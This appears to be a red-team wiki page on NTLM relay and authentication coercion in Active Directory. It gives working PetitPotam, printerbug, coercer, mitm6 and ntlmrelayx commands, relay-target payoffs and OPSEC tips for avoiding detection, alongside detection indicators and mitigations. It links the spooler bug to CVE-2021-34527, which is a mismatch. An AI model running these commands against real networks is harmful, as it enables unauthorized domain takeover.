---
title: NTLM Relay & Authentication Coercion
type: concept
created: 2026-06-13
updated: 2026-09-07
tags: [ntlm, active-directory, relay, coercion]
---

# NTLM Relay & Authentication Coercion

[[ntlm]] is vulnerable to relaying: an attacker who can intercept or trigger
NTLM authentication doesn't need to crack the hash — they relay the live
challenge-response to a *different* protocol/server and authenticate as the
victim there. Coercion techniques are how an attacker *forces* a victim
(often a Domain Controller or other machine account) to authenticate to the
attacker in the first place.

## Coercion techniques

- **PetitPotam** — abuses MS-EFSRPC to make a DC authenticate to an
  arbitrary host over SMB.
- **PrinterBug / Spooler** — abuses MS-RPRN (Print Spooler) similarly
  ([[printer-bug]], CVE-2021-34527).
- **PrivExchange** — makes Exchange authenticate as SYSTEM if unpatched.
- **mitm6 + WPAD spoofing** — on-network, no-creds path: take over IPv6 DNS
  via DHCPv6 (mitm6), then spoof the WPAD location so hosts/computer
  accounts authenticate to an attacker-controlled HTTP proxy. Works against
  any host that treats the attacker as part of the Intranet Zone.

## Commands

```bash
# --- Coercion ---
# PetitPotam (MS-EFSRPC) — force <target> to auth to <listener>
python3 PetitPotam.py <listener-ip> <target-ip>

# PrinterBug / Spooler (MS-RPRN), via dementor or printerbug.py
python3 printerbug.py 'DOMAIN/user:password'@<target-ip> <listener-ip>

# Coercer — tries every known coercion method against a target
python3 coercer.py coerce -l <listener-ip> -t <target-ip> -u user -p password -d DOMAIN
```

```bash
# --- mitm6 + WPAD (no creds) ---
sudo mitm6 -d corp.local
ntlmrelayx.py -6 -t ldaps://dc01.corp.local -wh attacker-wpad -l /tmp/loot --delegate-access
```

```bash
# --- Generic relay setup (ntlmrelayx) ---
# To SMB (e.g. dump SAM / execute commands)
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'

# To LDAPS (account creation, attribute writes, RBCD)
ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access

# To AD CS HTTP enrollment — see [[ad-cs-esc-attacks]] ESC8
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

## Relay targets

| Relay target | Outcome |
|---|---|
| AD CS HTTP enrollment (`/certsrv/`) | Obtain a certificate as the victim → see [[ad-cs-esc-attacks]] ESC8/ESC11, [[esc8-ntlm-relay-adcs]] |
| LDAP/LDAPS | Authenticate as victim computer account; can create computer accounts (default Machine Account Quota = 10) and write `msDS-AllowedToActOnBehalfOfOtherIdentity` → see [[rbcd-via-ntlm-relay]] |
| SMB | Lateral movement / SAM access as victim |
| SCCM Management Point | Retrieve policy secrets — see [[sccm-abuse]] |

Note: relaying to LDAP for account-creation/attribute-write requires
**LDAPS** (creating accounts isn't allowed over unencrypted LDAP).

## Red-team notes (OPSEC)

- **Enumerate before you coerce.** Check SMB signing, LDAP signing/channel
  binding, and EPA on the AD CS/SCCM web endpoints first — those decide which
  relay target is even viable. Coercing into a dead relay is pure noise.
- **Pick the relay target by payoff, then coerce once to it:** LDAPS for RBCD /
  shadow-cred writes, AD CS HTTP for ESC8 ([[esc8-ntlm-relay-adcs]]), SMB for
  lateral movement, SCCM MP for policy secrets ([[sccm-abuse]]). One coerced
  auth to one endpoint — don't spray coercion methods.
- **mitm6/Responder are loud and network-wide.** Time-box them, scope to the
  target subnet, and prefer targeted RPC coercion ([[printer-bug]], PetitPotam,
  `coercer`) when you already know the victim — poisoning is a fallback.
- **Machine-account auth to a new IP is the tell** (4624 type 3 from a server
  to a workstation) — expect it to be caught on a monitored estate and keep the
  window tight.
- **Runs from your Linux operator host** by design (`ntlmrelayx.py`,
  `mitm6`) — nothing lands on the victim, only the coerced auth on the wire.

## Detection

- Unexpected SMB/HTTP/LDAP authentications from DCs or other servers to
  workstation IPs.
- Event 4624 (logon) Type 3 from machine accounts to non-standard hosts.
- DHCPv6/Router Advertisement traffic in IPv4-only environments (mitm6
  indicator).
- Event 5136 — new computer accounts followed quickly by
  `msDS-AllowedToActOnBehalfOfOtherIdentity` writes (RBCD relay chain).

## Mitigations

- **SMB signing** (mandatory) — blocks SMB relay.
- **LDAP signing + LDAP channel binding** — only mitigation for LDAP/LDAPS
  relay.
- **EPA (Extended Protection for Authentication) + HTTPS** on AD CS web
  endpoints and SCCM MP — blocks ESC8/ESC11/SCCM relay.
- **Disable NTLM** domain-wide where feasible (forces Kerberos, which is far
  harder to relay).
- **mitm6**: block inbound/outbound DHCPv6 and ICMPv6 Router Advertisement
  via Windows Firewall GPO if IPv6 isn't used internally.
- **WPAD**: disable via GPO and disable the `WinHttpAutoProxySvc` service if
  unused.
- **RPC filters** on DCs to restrict MS-EFSRPC (PetitPotam) and MS-RPRN
  (PrinterBug).
- **Protected Users** / "account is sensitive and cannot be delegated" on
  Tier-0 accounts — limits impact even if RBCD relay succeeds.

## Links

- [[ntlm]] — the underlying protocol being relayed
- [[ad-cs-esc-attacks]] — ESC8/ESC11 relay targets
- [[esc8-ntlm-relay-adcs]] — full PetitPotam → ESC8 → DCSync chain
- [[printer-bug]] — the spooler coercion vector (CVE-2021-34527)
- [[wpad]] — the ambient WPAD capture that feeds a relay
- [[responder]] — the LLMNR/NBNS capture that feeds a relay
- [[rbcd-via-ntlm-relay]] — mitm6/WPAD → LDAP relay → RBCD, no creds needed
- [[kerberos-delegation-abuse]] — RBCD mechanics once delegation rights are set
- [[sccm-abuse]] — SCCM MP as a relay target

## References

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [dirkjanm.io: Worst of both worlds — NTLM relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
</content>
